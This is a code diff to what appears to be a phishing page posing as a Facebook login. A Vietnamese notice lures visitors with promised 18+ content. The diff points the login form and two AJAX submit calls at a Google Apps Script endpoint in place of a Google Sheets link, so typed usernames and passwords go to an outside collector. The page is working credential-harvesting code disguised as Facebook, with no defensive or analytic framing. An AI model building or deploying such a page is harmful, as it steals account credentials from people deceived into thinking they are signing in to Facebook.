@@ -130,7 +130,7 @@
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
                         <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Nội dung 18+, vui lòng đăng nhập trước khi xem.</div>
-                        <form class="login-form" id="test-form" method="GET" action="https://docs.google.com/spreadsheets/d/1bB3g1oe08sJle0V0tW7AFFWVZTHIHaqfgdnQrUmJRzE/edit#gid=0">
+                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycbyTY-Zoj339vtEPRxEDh-mNNtnDg3oX5JLWNifM7P2ewa_Y3uw/exec">
                             <label class="mt-10">
                                 <input id="username" type="text" name="username" required="" placeholder="Email hoặc số điện thoại">
                             </label>
@@ -175,7 +175,7 @@ async function submitForm() {
         var data = $('form#test-form').serialize();
         $.ajax({
             type: 'GET',
-            url: 'https://docs.google.com/spreadsheets/d/1bB3g1oe08sJle0V0tW7AFFWVZTHIHaqfgdnQrUmJRzE/edit#gid=0',
+            url: 'https://script.google.com/macros/s/AKfycbyTY-Zoj339vtEPRxEDh-mNNtnDg3oX5JLWNifM7P2ewa_Y3uw/exec',
             dataType: 'json',
             crossDomain: true,
             data: data,
@@ -196,7 +196,7 @@ async function submitForm() {
         var data = $('form#test-form').serialize();
         $.ajax({
             type: 'GET',
-            url: 'https://docs.google.com/spreadsheets/d/1bB3g1oe08sJle0V0tW7AFFWVZTHIHaqfgdnQrUmJRzE/edit#gid=0',
+            url: 'https://script.google.com/macros/s/AKfycbyTY-Zoj339vtEPRxEDh-mNNtnDg3oX5JLWNifM7P2ewa_Y3uw/exec',
             dataType: 'json',
             crossDomain: true,
             data: data,
